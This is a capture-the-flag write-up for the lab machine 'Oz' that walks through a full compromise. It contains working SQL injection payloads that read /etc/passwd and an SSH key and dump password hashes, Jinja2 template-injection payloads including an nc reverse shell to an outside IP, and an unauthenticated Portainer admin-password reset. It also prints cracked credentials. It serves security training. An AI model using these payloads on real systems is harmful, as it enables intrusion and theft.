@@ -1,0 +1,260 @@
+Oz
+
+4t h January 2019 / Document No D19.100.02
+
+Prepared By: egre55
+Machine Author: incidrthreat & Mumbai
+Difficulty: H ard
+Classification: Official
+
+                                                                        Page 1 / 21
+SYNOPSIS
+
+Oz is a hard to insane difficulty machine which teaches about web application enumeration, SQL
+Injection, Server-Side Template Injection, SSH tunnelling, and how Portainer functionality can be
+abused to compromise the host operating system. The techniques learned here are directly
+applicable to real-world situations.
+
+Skills Required                              Skills Learned
+
+     Intermediate knowledge of Web                Gain familiarity with WFuzz advanced
+         application enumeration techniques           options
+
+     Intermediate knowledge of SQL                Accessing file system via SQL injection
+         injection techniques                     Extraction and cracking of
+
+     Basic knowledge of Linux                         PBKDF2-SHA256 hashes
+                                                  Server-Side Template Injection
+                                                  Port forwarding using sshuttle
+                                                  Privilege escalation via Portainer
+
+                                                      authentication bypass
+
+                                             Page 2 / 21
+Enumeration
+Nmap
+
+ masscan -p1-65535,U:1-65535 10.10.10.96 --rate=1000 -p1-65535,U:1-65535 -e
+ tun0 > ports
+ ports=$(cat ports | awk -F " " ' {print $4}' | awk -F " /" ' {print $1}' |
+ sort -n | tr ' \n' ' ,' | sed 's/,$//')
+ nmap -Pn -sV -sC -p$ ports 10.10.10.96
+
+Nmap reveals Werkzeug instances on port 80 and 8080. Werkzeug is a WSGI (Web Server
+Gateway Interface) utility library for Python. WSGI functionality includes URL Routing (mapping
+HTTP requests to code to be invoked), Request and Response Objects, and a Template Engine.
+
+                                                                                                                  Page 3 / 21
+Web Application Enumeration
+
+The web page on port 80 requests that a username is registered, while port 8080 displays a
+login page for the "GBR Support" portal. Attempts to log in with common credentials such as
+admin:admin are not successful.
+
+If Werkzeug debug mode has been left enabled, this can result in easy command execution.
+However, in this instance it is not enabled.
+https://raw.githubusercontent.com/Fare9/PyWerkzeug-Debug-Command-Execution/master/exploit_werkze
+ug.py
+
+                                                                                                                  Page 4 / 21
+WFuzz is run against the installation on port 80, but returns HTTP 200 response codes for all
+queries.
+
+Noting that the line length of the responses is zero, the WFuzz option to exclude responses with
+lines of zero length is specified. "users" is confirmed as an existing object/page.
+
+After navigating to " / users" , the registration message is still shown, although the formatting has
+changed. However, appending a word to /users, e.g. "/users/admin" results in an API window
+displaying JSON output, which confirms that "admin" is a valid username. It seems that the HTTP
+request for "/users/admin" invoked a SQL query such as "SELECT * FROM users WHERE
+username='admin'".
+
+                                                                                                                  Page 5 / 21
+Exploitation
+SQL Injection
+
+Various SQL injection payloads are attempted and the famous ' OR '1'='1 returns "dorthi",
+which confirms that there is a SQL injection vulnerability.
+
+The database version and name are queried.
+
+It is also worth checking if it is possible to read from the file system.
+load_file('/etc/passwd') doesn't return any output, but providing hex-encoded file
+paths is successful. A programming/scripting language of choice can be used to generate the
+hex-encoded values
+ printf 0x; p rintf " /etc/passwd" | xxd -ps -c 200 | tr -d '\n'; e cho
+
+                                                                                                                  Page 6 / 21
+ http://10.10.10.96/users/writeup' UNION ALL SELECT
+ load_file(0x2f6574632f706173737764)-- -
+
+See if a SSH key exists for user "dorthi":
+ http://10.10.10.96/users/writeup' union all select
+ load_file(0x2f686f6d652f646f727468692f2e7373682f69645f727361)-- -
+An encrypted SSH key exists. After copying the data within the quotes, the following command is
+issued to fix the formatting:
+ cat id_rsa | awk ' {gsub(/\\n/,"\n")}1'
+
+                                                                                                                  Page 7 / 21
+Focus can be turned to enumerating the database, and checking for user-created tables.
+ http://10.10.10.96/users/writeup' UNION ALL SELECT table_name FROM
+ INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema',
+ 'mysql') LIMIT 0,1-- writeup
+
+ http://10.10.10.96/users/writeup' UNION ALL SELECT table_name FROM
+ INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema',
+ 'mysql') LIMIT 1,1-- writeup
+
+The tables "tickets_gbw" and "users_gbw" exist. Now to enumerate the columns:
+ http://10.10.10.96/users/writeup' UNION ALL SELECT column_name FROM
+ INFORMATION_SCHEMA.COLUMNS WHERE table_schema=database() AND
+ table_name='users_gbw' LIMIT 1,1-- writeup
+ http://10.10.10.96/users/writeup' UNION ALL SELECT column_name FROM
+ INFORMATION_SCHEMA.COLUMNS WHERE table_schema=database() AND
+ table_name='users_gbw' LIMIT 2,1-- writeup
+The table "users_gbw" contains columns "username" and "password". Multiple logins exist, and
+
+                                                                                                                  Page 8 / 21
+usernames and associated password hashes are extracted.
+ http://10.10.10.96/users/writeup' UNION ALL SELECT
+ CONCAT(username,':',password) FROM users_gbw WHERE id='1' -- writeup
+ ...
+ http://10.10.10.96/users/writeup' UNION ALL SELECT
+ CONCAT(username,':',password) FROM users_gbw WHERE id='6' -- writeup
+
+                                                                                                                  Page 9 / 21
+PBKDF2-SHA256 Hash Cracking
+
+The hash format is identified and is supported by John.
+PBKDF2-SHA256 is quite a computationally expensive algorithm, but after a while (potentially a
+few hours in a VM) the password wizardofoz22 is found for login wizard.oz.
+
+                                                                                                                 Page 10 / 21
+Server-Side Template Injection
+
+Testing
+
+The gained credentials are used to log into the "GBR Support"  portal. Once logged in, it seems
+that functionality to create tickets is available. A new ticket is created and the request is
+examined in Burp Suite.
+Given the underlying technologies, it is worth testing for SSTI vulnerabilities. A simple injection is
+attempted, and if there is a vulnerability the answer 49 should be returned.
+
+ {{7*7}}
+
+It is, and in the next test a string of seven sevens is likewise returned.
+
+                                                                            Page 11 / 21
+ {{'7'*7}}
+
+Template engines respond differently to these tests, and depending on the output, the engine
+can be identified. The Flask/Jinja2 template engine will respond with 7777777 to {{7*'7'}},
+and so further testing is undertaken based on this assumption.
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injecti
+ons#basic-injection
+
+                                                                                                                 Page 12 / 21
+Within Jinja2 templates, several global variables exist, such as self and config.
+ {{self}}
+
+ {{config}}
+
+The output of the config variable reveals the credentials dorthi:N0Pl4c3L1keH0me. Given
+the possession of a private key and credentials it would be good to test for SSH access, but the
+Nmap scan showed that SSH is not available.
+The available subclasses are then enumerated.
+ {{''.__class__.mro()[2].__subclasses__()}}
+
+                                                                                                                 Page 13 / 21
+This returns a lot of information, and the data (minus the headers) is re-formatted to allow for
+easier enumeration.
+ awk '{gsub(/&#39;/,"\n")}1' <classes.in | grep -v ';' | sed -e " 1d" >
+ classes.out
+ grep -n ' file\|subprocess' classes.out
+Subclasses such as "file" and "subprocess.Popen" are of interest and are both available.
+
+"file" is at 40 in the list and "subprocess.Popen" is at 230, and these numbers are used to invoke
+their functionality. Files can be read using the following command:
+ {{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}
+
+                                                                                                                 Page 14 / 21
+Command Execution
+
+Command execution is possible using "subprocess.Popen". Command output can be redirected
+to a file and subsequently read, or a reverse shell can be obtained.
+ {{''.__class__.mro()[2].__subclasses__()[230]('/usr/bin/nc 10.10.14.2 443
+ -e /bin/sh',shell=True)}}
+
+Command Execution is also possible by loading objects into the configuration environment via
+"from_pyfile":
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injecti
+ons
+https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html
+ name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg',
+ 'w').write('from subprocess import check_output\n\nRUNCMD =
+ check_output\n') }}&desc=
+ name={{ config.from_pyfile('/tmp/evilconfig.cfg') }}&desc=
+ name={{ config['RUNCMD']('ls -al',shell=True) }}&desc=
+
+                                                                                                                 Page 15 / 21
+Page 16 / 21
+Privilege Escalation
+SSH Access as Dorthi
+
+The current user is root, although the shell is currently inside a docker container.
+ grep -i docker /proc/self/cgroup 2>/dev/null; find / -name "*dockerenv*"
+ -exec ls -la {} \; 2>/dev/null
+
+Enumeration continues, and the file "knockd.conf" within the ".secret" directory is examined. This
+reveals the port knocking sequence required to open SSH.
+
+The "knock" python script created by @grongor is used. SSH passphrase: N 0Pl4c3L1keH0me
+ python3 /opt/knock/knock 10.10.10.96 -u 40809 50212 46969 -d 10
+ ssh dorthi@10.10.10.96 -i id_rsa
+https://github.com/grongor/knock
+
+                                                                                                                 Page 17 / 21
+Portainer Abuse
+
+sudo -l reveals that Dorthi is allowed to run specific docker commands as root.
+The docker networks are listed and inspected.
+ sudo /usr/bin/docker network ls
+ sudo /usr/bin/docker network inspect bridge
+
+The IP address 172.17.0.2 is specified as a Portainer instance, which is a UI for managing Docker
+                                                                                                                 Page 18 / 21
+containers. Sending a CLI request to this IP address on port 9000 is successful, which confirms
+that the Portainer web interface is available, although it is not accessible remotely.
+ nc 172.17.0.2 9000
+ GET / HTTP/1.1
+ Host: 172.17.0.2
+
+The port knock sequence is sent again, and sshuttle is used to make the web interface
+accessible remotely.
+ python3 /opt/knock/knock 10.10.10.96 -u 40809 50212 46969 -d 10
+ /opt/sshuttle/run -r dorthi@10.10.10.96 172.17.0.2 -e ' ssh -i id_rsa'
+After navigating to http://172.17.0.2:9000/, common credentials are attempted but are
+unsuccessful. It seems that Portainer prompts to set an admin password upon installation, rather
+than using default credentials.
+However, a little googling for setting the password via CLI reveals an issue page on the Portainer
+GitHub repo, with an answer by @dilshanraja confirming that the admin password can be reset by
+sending a POST request to the API with the new credentials provided as JSON data.
+
+                                                                                                                 Page 19 / 21
+https://github.com/portainer/portainer/issues/428
+The password is reset:
+
+ curl -H "Content-Type: application/json"
+ http://172.17.0.2:9000/api/users/admin/init -d '{"password":"XSDAfxrew65x"}'
+After gaining access to the Portainer web interface, the available images are inspected.
+Python:2.7-alpine seems to be a good choice to create a container due to its small size. The
+Image ID is copied, and a new container is created in privileged mode.
+ sha256:3e4f91c08d0f8e8981391f89e4f27d1c26a3662be0bf19af20d95eb5d5fa8b6a
+
+                                                                                                                Page 20 / 21
+After starting the container, the console link ">_ Console" is clicked, and "/bin/sh" is connected.
+The host's file system is now accessible as root, and the final flag can be captured.
+
+                                                                                                                 Page 21 / 21
+
